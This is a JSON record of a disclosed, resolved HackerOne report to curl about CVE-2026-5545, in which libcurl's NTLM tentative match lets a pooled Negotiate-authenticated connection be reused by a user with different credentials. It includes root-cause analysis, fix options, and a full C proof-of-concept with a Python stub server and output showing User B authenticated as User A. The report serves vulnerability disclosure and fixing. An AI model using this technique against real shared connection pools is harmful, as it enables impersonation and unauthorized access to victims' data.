@@ -1,0 +1,125 @@
+{
+  "id": 3642555,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQyNTU1",
+  "url": "https://hackerone.com/reports/3642555",
+  "title": "CVE-2026-5545: wrong reuse of HTTP Negotiate connection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-01T15:36:23.858Z",
+  "submitted_at": "2026-04-01T15:36:25.171Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "quaccws",
+    "url": "/quaccws",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g22iuvkxcw6ev6ct0i0jk61sc2yq/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-5545"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-29T07:15:01.598Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-04-29T06:08:47.871Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nAn attacker sharing a libcurl multi-handle connection pool can hijack another user's Negotiate/Kerberos-authenticated connection. When User A authenticates via Negotiate (SPNEGO) and the connection returns to the pool, User B using `CURLAUTH_ANY` with different credentials gets that connection attached to their transfer. On servers with persistent Negotiate auth (Windows IIS with Kerberos — the default), User B's requests execute as User A.\n\nThe root cause is in `url_match_auth_ntlm()` (`lib/url.c:1092`): a tentative match sets `m->found` for a connection with mismatched credentials, returns FALSE, which exits the matching chain before `url_match_auth_nego()` can reject the connection. `url_match_result()` then attaches the connection based solely on `m->found` being non-NULL, ignoring the FALSE result.\n\n## Affected version\n- curl 8.20.0-DEV (master, commit 2b3dfb4, 2026-03-31)\n- Built with `--enable-debug --with-openssl --with-gssapi`\n- Both `USE_NTLM` and `USE_SPNEGO` compiled in (verified via `curl_setup.h`)\n- Test uses curl's built-in `CURL_GSS_STUB` (debug-build fake GSSAPI)\n\n## Steps To Reproduce:\n1. Start the test server (simulates IIS persistent Negotiate auth):\n\n```bash\npython3 nego_server.py 8999 &\n```\n\n2. Compile and run the PoC:\n\n```bash\ngcc -o poc poc.c -I../include -L../lib/.libs -lcurl \\\n    $(pkg-config --libs openssl libnghttp2 zlib libbrotlidec libzstd libpsl \\\n      krb5-gssapi krb5 libidn2) -lldap -llber -Wl,-rpath,../lib/.libs\n\nCURL_STUB_GSS_CREDS=\"KRB5_userA\" ./poc\n```\n\n**PoC output (abbreviated):**\n\n```\n[STEP 1] User A: Negotiate auth to http://127.0.0.1:8999/api/secret\n  [USER_A] Server auth using Negotiate with user 'userA'\n  [USER_A] Authorization: Negotiate S1JCNV91c2VyQTpIVFRQ...\n\n[RESULT A] HTTP 200\n[RESULT A] Body: {\"identity\": \"KRB5_userA\", \"mechanism\": \"negotiate_complete\"}\n\n[STEP 2] User A's connection is now in the pool\n[STEP 3] User B: CURLAUTH_ANY with DIFFERENT creds\n\n  [USER_B] [POC-TRACE] url_match_result: attaching conn #1\n           (result param=0, IGNORED). negotiate_state=0\n  [USER_B] Reusing existing http: connection with host 127.0.0.1\n  [USER_B] Server auth using Negotiate with user 'userB'\n  [USER_B] Authorization: Negotiate S1JCNV91c2VyQTpIVFRQ...\n                                    ^^^^^^^^^^^^^^^^\n                                    Still User A's GSSAPI context!\n\n[RESULT B] HTTP 200\n[RESULT B] Body: {\"identity\": \"KRB5_userA\", ...}\n                               ^^^^^^^^^^^\n                  User B authenticated as User A!\n\n[!!!] VULNERABLE: User B was authenticated as User A!\n```\n\n**Server-side log confirms:**\n```\n[AUTH] conn=127.0.0.1:38018 identity=KRB5_userA -> GSS_AUTHSUCC\n[401]  conn=127.0.0.1:38020 no auth\n[AUTH] conn=127.0.0.1:38020 identity=KRB5_userA -> GSS_AUTHSUCC\n                                      ^^^^^^^^^^\n              User B's connection authenticated as User A\n```\n## Root Cause Analysis\n\nThree functions interact to produce the bug:\n\n### 1. `url_match_auth_ntlm()` — Sets tentative match with wrong creds (url.c:1085-1093)\n\n```c\nif(m->want_ntlm_http) {\n    if(Curl_timestrcmp(m->needle->user, conn->user) ||\n       Curl_timestrcmp(m->needle->passwd, conn->passwd)) {\n      // Credentials DON'T MATCH, but...\n      if(conn->http_ntlm_state == NTLMSTATE_NONE)\n        m->found = conn;    // <-- SETS TENTATIVE MATCH ANYWAY\n      return FALSE;          // <-- Returns FALSE, exits url_match_conn()\n    }\n}\n```\n\nWhen User B requests with `CURLAUTH_ANY` (which includes NTLM + Negotiate), `want_ntlm_http` is TRUE. User B's credentials don't match User A's on the pooled connection. But `http_ntlm_state == NTLMSTATE_NONE` (because Negotiate was used, not NTLM), so `m->found = conn` is set.\n\nThe `return FALSE` at line 1093 exits `url_match_conn()` immediately.\n\n### 2. `url_match_auth_nego()` — NEVER CALLED (url.c:1239-1247)\n\n```c\nif(!url_match_auth_ntlm(conn, m))    // line 1239 — returns FALSE\n    return FALSE;                     // <-- EXITS HERE\n// url_match_auth_nego() at line 1244 is NEVER REACHED\n```\n\nThe Negotiate credential check that would reject this connection is skipped entirely.\n\n### 3. `url_match_result()` — Ignores result, uses m->found (url.c:1263-1271)\n\n```c\nstatic bool url_match_result(bool result, void *userdata) {\n    struct url_conn_match *match = userdata;\n    (void)result;           // <-- RESULT PARAMETER IS IGNORED\n    if(match->found) {      // <-- Tentative match from step 1\n        Curl_attach_connection(match->data, match->found);\n        return TRUE;        // <-- Connection attached!\n    }\n```\n\nThe `result` parameter (which is FALSE) is explicitly cast to void and ignored. The function only checks `match->found`, which was set by the NTLM tentative match.\n\n## Why Existing CVE Fixes Don't Cover This\n\n| CVE | What it fixed | Why this is different |\n|-----|---------------|----------------------|\n| CVE-2026-1965 | Bad Negotiate reuse when `want_nego_http` is FALSE | Our path: `want_nego_http` is TRUE but never checked |\n| CVE-2022-22576 | OAuth2 bearer bypass in connection reuse | Different auth type, different code path |\n| CVE-2022-27782 | TLS/SSH too eager reuse | Different matching function |\n| CVE-2023-27535 | FTP too eager connection reuse | Protocol-specific, not HTTP auth |\n\nThe interaction between the NTLM tentative match and the Negotiate auth check is a novel code path that wasn't addressed by any previous fix.\n\n## Recommended Fix\n\nOption A — Don't set tentative match if connection has active Negotiate state:\n\n```c\nif(conn->http_ntlm_state == NTLMSTATE_NONE\n   && conn->http_negotiate_state == GSS_AUTHNONE)\n    m->found = conn;\n```\n\nOption B — Make `url_match_result()` verify the `result` parameter:\n\n```c\nstatic bool url_match_result(bool result, void *userdata) {\n    struct url_conn_match *match = userdata;\n    if(result && match->found) {  // <-- Check result\n        Curl_attach_connection(match->data, match->found);\n        return TRUE;\n    }\n```\n\nOption A is simpler and more targeted. Option B is more defensive but changes behavior for all tentative match paths.\n\n## Supporting Materials\n\n- PoC source: `poc/poc.c` — libcurl multi-handle exploit\n- Test server: `poc/nego_server.py` — simulates IIS persistent Negotiate auth\n- Instrumented `url.c` with `[POC-TRACE]` logging at match decision points\n- Full PoC output showing User B authenticated as User A\n\n## References\n\n- `lib/url.c:1077-1139` — `url_match_auth_ntlm()`\n- `lib/url.c:1145-1196` — `url_match_auth_nego()`\n- `lib/url.c:1201-1261` — `url_match_conn()` (orchestrator)\n- `lib/url.c:1263-1286` — `url_match_result()` (attacher)\n- `lib/curl_gssapi.c:88-309` — Stub GSS (used for PoC)\n\n## nego_server.py\n```python\n#!/usr/bin/env python3\n\"\"\"\nTest server speaking the curl stub GSS protocol.\n\nStub protocol (lib/curl_gssapi.c):\n- Client sends base64(creds:target:type:padding)\n- Server responds with:\n  - base64(\"C\") = Qw== for Continue\n  - base64(\"D\") = RA== for Done (auth complete)\n\nFor KRB5: client sends type=1 (STUB_GSS_KRB5), server replies D -> GSS_S_COMPLETE\nThis causes curl to set http_negotiate_state = GSS_AUTHSUCC\n\nThe server tracks authenticated connections by TCP socket and serves\nsubsequent requests using the original identity (persistent Negotiate auth,\nlike Windows IIS with Kerberos).\n\"\"\"\nimport http.server\nimport socketserver\nimport base64\nimport json\nimport sys\n\nconn_auth = {}  # conn_key -> identity\nrequest_log = []\n\n\nclass NegotiateHandler(http.server.BaseHTTPRequestHandler):\n    protocol_version = \"HTTP/1.1\"\n\n    def log_message(self, fmt, *args):\n        pass\n\n    def _key(self):\n        return f\"{self.client_address[0]}:{self.client_address[1]}\"\n\n    def do_GET(self):\n        k = self._key()\n        auth = self.headers.get(\"Authorization\", \"\")\n\n        if auth.startswith(\"Negotiate \"):\n            token_b64 = auth.split(\" \", 1)[1]\n            try:\n                token = base64.b64decode(token_b64)\n                # Token format: creds:HTTP@host:type:padding\n                parts = token.split(b\":\")\n                identity = parts[0].decode(\"utf-8\", errors=\"replace\")\n            except Exception as e:\n                identity = f\"DECODE_ERR:{e}\"\n\n            conn_auth[k] = identity\n\n            # Reply with \"D\" (Done) base64-encoded to complete the handshake\n            # This tells curl's stub GSS that auth is complete -> GSS_S_COMPLETE\n            # -> http_negotiate_state = GSS_AUTHSUCC\n            done_token = base64.b64encode(b\"D\").decode()\n\n            self.send_response(200)\n            self.send_header(\"WWW-Authenticate\", f\"Negotiate {done_token}\")\n            self.send_header(\"Content-Type\", \"application/json\")\n            body = json.dumps({\n                \"status\": \"authenticated\",\n                \"identity\": identity,\n                \"conn\": k,\n                \"mechanism\": \"negotiate_complete\"\n            })\n            self.send_header(\"Content-Length\", str(len(body)))\n            self.end_headers()\n            self.wfile.write(body.encode())\n\n            print(f\"[AUTH] conn={k} identity={identity} -> GSS_AUTHSUCC\", flush=True)\n\n        elif k in conn_auth:\n            # PERSISTENT AUTH: connection already authenticated\n            # No Authorization header needed — identity comes from TCP conn\n            identity = conn_auth[k]\n\n            self.send_response(200)\n            self.send_header(\"Content-Type\", \"application/json\")\n            body = json.dumps({\n                \"status\": \"persistent_auth\",\n                \"identity\": identity,\n                \"conn\": k,\n                \"auth_header\": auth[:80] if auth else \"(none)\",\n                \"note\": \"Identity from TCP connection, NOT from current request\"\n            })\n            self.send_header(\"Content-Length\", str(len(body)))\n            self.end_headers()\n            self.wfile.write(body.encode())\n\n            print(f\"[PERSISTENT] conn={k} identity={identity} \"\n                  f\"auth_hdr={'YES' if auth else 'NO'}\", flush=True)\n\n        else:\n            # 401 challenge\n            self.send_response(401)\n            self.send_header(\"WWW-Authenticate\", \"Negotiate\")\n            self.send_header(\"Content-Type\", \"text/plain\")\n            body = \"Authentication required\"\n            self.send_header(\"Content-Length\", str(len(body)))\n            self.end_headers()\n            self.wfile.write(body.encode())\n\n            print(f\"[401] conn={k} no auth\", flush=True)\n\n\nclass Server(socketserver.ThreadingTCPServer):\n    allow_reuse_address = True\n    daemon_threads = True\n\n\nif __name__ == \"__main__\":\n    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8999\n    s = Server((\"127.0.0.1\", port), NegotiateHandler)\n    print(f\"[*] Negotiate stub server on :{port}\", flush=True)\n    s.serve_forever()\n```\n## poc.c\n```c\n/*\n * PoC: NTLM tentative connection match bypasses Negotiate auth state check\n *\n * Demonstrates that in a multi-handle shared connection pool, when:\n *   1. Handle A authenticates via Negotiate (SPNEGO/Kerberos)\n *   2. Handle B requests the same host with CURLAUTH_ANY + different creds\n *\n * The NTLM tentative match in url_match_auth_ntlm() (url.c:1092) sets\n * m->found on the connection with mismatched credentials, returns FALSE,\n * which exits url_match_conn() BEFORE url_match_auth_nego() runs.\n * url_match_result() then attaches the connection based solely on m->found.\n *\n * Result: Handle B's request goes out on Handle A's TCP connection.\n * On a server with persistent Negotiate auth (IIS/Kerberos default),\n * this means Handle B is authenticated as User A.\n *\n * Build:\n *   gcc -o poc poc.c -I../include -L../lib/.libs -lcurl -Wl,-rpath,../lib/.libs\n *\n * Run:\n *   python3 server.py 8999 &\n *   ./poc\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <curl/curl.h>\n\n#define URL \"http://127.0.0.1:8999/api/secret\"\n\n/* Capture response body */\nstruct response {\n    char *data;\n    size_t size;\n};\n\nstatic size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userp)\n{\n    struct response *resp = (struct response *)userp;\n    size_t total = size * nmemb;\n    char *tmp = realloc(resp->data, resp->size + total + 1);\n    if(!tmp) return 0;\n    resp->data = tmp;\n    memcpy(&resp->data[resp->size], ptr, total);\n    resp->size += total;\n    resp->data[resp->size] = 0;\n    return total;\n}\n\n/* Debug callback to trace connection IDs and auth headers */\nstatic int debug_cb(CURL *handle, curl_infotype type, char *data,\n                    size_t size, void *userp)\n{\n    const char *tag = (const char *)userp;\n    if(type == CURLINFO_TEXT) {\n        /* Show connection reuse and auth-related debug lines */\n        if(strstr(data, \"Re-using\") || strstr(data, \"onnection\") ||\n           strstr(data, \"uthoriz\") || strstr(data, \"uthenticat\") ||\n           strstr(data, \"NTLM\") || strstr(data, \"egotiat\") ||\n           strstr(data, \"Found bundle\") || strstr(data, \"multiplex\"))\n            printf(\"  [%s] %.*s\", tag, (int)size, data);\n    }\n    else if(type == CURLINFO_HEADER_OUT) {\n        /* Show outgoing Authorization headers */\n        const char *auth = strstr(data, \"Authorization:\");\n        if(auth) {\n            const char *end = strstr(auth, \"\\r\\n\");\n            int len = end ? (int)(end - auth) : 60;\n            printf(\"  [%s] >>> %.*s\\n\", tag, len, auth);\n        }\n        /* Show which host we're connecting to */\n        const char *host = strstr(data, \"Host:\");\n        if(host) {\n            const char *end = strstr(host, \"\\r\\n\");\n            int len = end ? (int)(end - host) : 40;\n            printf(\"  [%s] >>> %.*s\\n\", tag, len, host);\n        }\n    }\n    return 0;\n}\n\nint main(void)\n{\n    CURLM *multi;\n    CURL *easy_a, *easy_b;\n    struct response resp_a = {NULL, 0};\n    struct response resp_b = {NULL, 0};\n    int still_running = 0;\n    long http_code_a = 0, http_code_b = 0;\n    char *conn_id_a = NULL, *conn_id_b = NULL;\n\n    printf(\"=== PoC: NTLM tentative match bypasses Negotiate auth check ===\\n\\n\");\n    printf(\"Expected: User B should get 401 or authenticate as User B\\n\");\n    printf(\"Actual:   User B reuses User A's Negotiate connection\\n\\n\");\n\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n\n    multi = curl_multi_init();\n\n    /* --- Handle A: User A authenticates with Negotiate --- */\n    easy_a = curl_easy_init();\n    curl_easy_setopt(easy_a, CURLOPT_URL, URL);\n    curl_easy_setopt(easy_a, CURLOPT_HTTPAUTH, (long)CURLAUTH_NEGOTIATE);\n    curl_easy_setopt(easy_a, CURLOPT_USERPWD, \"userA:passwordA\");\n    curl_easy_setopt(easy_a, CURLOPT_WRITEFUNCTION, write_cb);\n    curl_easy_setopt(easy_a, CURLOPT_WRITEDATA, &resp_a);\n    curl_easy_setopt(easy_a, CURLOPT_VERBOSE, 1L);\n    curl_easy_setopt(easy_a, CURLOPT_DEBUGFUNCTION, debug_cb);\n    curl_easy_setopt(easy_a, CURLOPT_DEBUGDATA, \"USER_A\");\n\n    printf(\"[STEP 1] User A: Negotiate auth to %s\\n\", URL);\n    curl_multi_add_handle(multi, easy_a);\n\n    /* Run User A's request to completion */\n    do {\n        CURLMcode mc = curl_multi_perform(multi, &still_running);\n        if(mc == CURLM_OK && still_running) {\n            mc = curl_multi_poll(multi, NULL, 0, 1000, NULL);\n        }\n        if(mc != CURLM_OK) {\n            fprintf(stderr, \"multi_perform error: %d\\n\", mc);\n            break;\n        }\n    } while(still_running);\n\n    /* Drain messages */\n    {\n        int msgs_left;\n        struct CURLMsg *msg;\n        while((msg = curl_multi_info_read(multi, &msgs_left))) {\n            if(msg->msg == CURLMSG_DONE) {\n                if(msg->easy_handle == easy_a) {\n                    curl_easy_getinfo(easy_a, CURLINFO_RESPONSE_CODE, &http_code_a);\n                    printf(\"\\n[RESULT A] HTTP %ld\\n\", http_code_a);\n                    if(resp_a.data)\n                        printf(\"[RESULT A] Body: %s\\n\", resp_a.data);\n                }\n            }\n        }\n    }\n\n    /* Remove A but DON'T close it -- the connection stays in the pool */\n    curl_multi_remove_handle(multi, easy_a);\n    /* Close A's easy handle -- connection returns to pool */\n    curl_easy_cleanup(easy_a);\n\n    printf(\"\\n[STEP 2] User A's connection is now in the pool (Negotiate-authenticated)\\n\");\n    printf(\"[STEP 3] User B: CURLAUTH_ANY (NTLM|Negotiate|...) with DIFFERENT creds\\n\\n\");\n\n    /* --- Handle B: User B with different creds and CURLAUTH_ANY --- */\n    easy_b = curl_easy_init();\n    curl_easy_setopt(easy_b, CURLOPT_URL, URL);\n    /* CURLAUTH_ANY includes both NTLM and Negotiate flags */\n    curl_easy_setopt(easy_b, CURLOPT_HTTPAUTH, (long)CURLAUTH_ANY);\n    curl_easy_setopt(easy_b, CURLOPT_USERPWD, \"userB:passwordB\");\n    curl_easy_setopt(easy_b, CURLOPT_WRITEFUNCTION, write_cb);\n    curl_easy_setopt(easy_b, CURLOPT_WRITEDATA, &resp_b);\n    curl_easy_setopt(easy_b, CURLOPT_VERBOSE, 1L);\n    curl_easy_setopt(easy_b, CURLOPT_DEBUGFUNCTION, debug_cb);\n    curl_easy_setopt(easy_b, CURLOPT_DEBUGDATA, \"USER_B\");\n\n    curl_multi_add_handle(multi, easy_b);\n\n    /* Run User B's request */\n    do {\n        CURLMcode mc = curl_multi_perform(multi, &still_running);\n        if(mc == CURLM_OK && still_running) {\n            mc = curl_multi_poll(multi, NULL, 0, 1000, NULL);\n        }\n        if(mc != CURLM_OK) {\n            fprintf(stderr, \"multi_perform error: %d\\n\", mc);\n            break;\n        }\n    } while(still_running);\n\n    /* Drain messages */\n    {\n        int msgs_left;\n        struct CURLMsg *msg;\n        while((msg = curl_multi_info_read(multi, &msgs_left))) {\n            if(msg->msg == CURLMSG_DONE) {\n                if(msg->easy_handle == easy_b) {\n                    curl_easy_getinfo(easy_b, CURLINFO_RESPONSE_CODE, &http_code_b);\n                    printf(\"\\n[RESULT B] HTTP %ld\\n\", http_code_b);\n                    if(resp_b.data)\n                        printf(\"[RESULT B] Body: %s\\n\", resp_b.data);\n                }\n            }\n        }\n    }\n\n    printf(\"\\n=== ANALYSIS ===\\n\");\n    if(resp_b.data && strstr(resp_b.data, \"userA\")) {\n        printf(\"[!!!] VULNERABLE: User B was authenticated as User A!\\n\");\n        printf(\"[!!!] The server saw User A's identity on User B's request.\\n\");\n        printf(\"[!!!] Connection reuse bypassed Negotiate auth state check.\\n\");\n        curl_multi_remove_handle(multi, easy_b);\n        curl_easy_cleanup(easy_b);\n        curl_multi_cleanup(multi);\n        free(resp_a.data);\n        free(resp_b.data);\n        curl_global_cleanup();\n        return 0;  /* EXIT 0 = vuln confirmed (secret persists) */\n    }\n    else if(resp_b.data && strstr(resp_b.data, \"userB\")) {\n        printf(\"[OK] NOT VULNERABLE: User B authenticated as User B (correct).\\n\");\n    }\n    else if(http_code_b == 401) {\n        printf(\"[OK] NOT VULNERABLE: User B got 401 (connection not reused).\\n\");\n    }\n    else {\n        printf(\"[??] INCONCLUSIVE: User B HTTP %ld\\n\", http_code_b);\n        printf(\"[??] Response: %s\\n\", resp_b.data ? resp_b.data : \"(empty)\");\n        printf(\"[!!] Check if connection was reused from debug output above.\\n\");\n        printf(\"[!!] Key indicator: 'Re-using existing connection' in USER_B logs\\n\");\n    }\n\n    curl_multi_remove_handle(multi, easy_b);\n    curl_easy_cleanup(easy_b);\n    curl_multi_cleanup(multi);\n    free(resp_a.data);\n    free(resp_b.data);\n    curl_global_cleanup();\n    return 1;  /* EXIT 1 = not vulnerable */\n}\n```\n\n## Impact\n\n## Impact\n\nAn attacker sharing a libcurl multi-handle or connection pool with a victim can:\n\n1. **Impersonate the victim** on any server using persistent Negotiate auth (Windows IIS with Kerberos — the default enterprise configuration)\n2. **Access the victim's data** — the server sees the attacker's requests as coming from the victim's Kerberos identity\n3. **Perform actions as the victim** — write, delete, or modify data under the victim's authorization\n\n**Affected environments:**\n- Any application using libcurl's multi-handle with shared connection pool\n- HTTP client libraries wrapping libcurl (Python `pycurl`, PHP `curl_multi_*`, etc.)\n- Multi-tenant services where different users share a curl connection pool\n- Web application backends that reuse curl handles across requests\n\n**Preconditions:**\n- Both `USE_NTLM` and `USE_SPNEGO` compiled in (common — most distro builds include both)\n- Multi-handle or shared connection pool\n- User B uses `CURLAUTH_ANY` or explicitly enables both NTLM + Negotiate\n- Server uses persistent Negotiate auth (IIS/Kerberos default)",
+  "weakness": {
+    "id": 184,
+    "name": "Authentication Bypass by Primary Weakness"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 14,
+  "voters": [
+    "2026",
+    "rafiq_ym",
+    "shams9115",
+    "clayynh",
+    "dilshod365",
+    "jayanto_kumar_roy9",
+    "yapex7k",
+    "t-x13",
+    "hanselwhispered",
+    "ogspacejam22",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
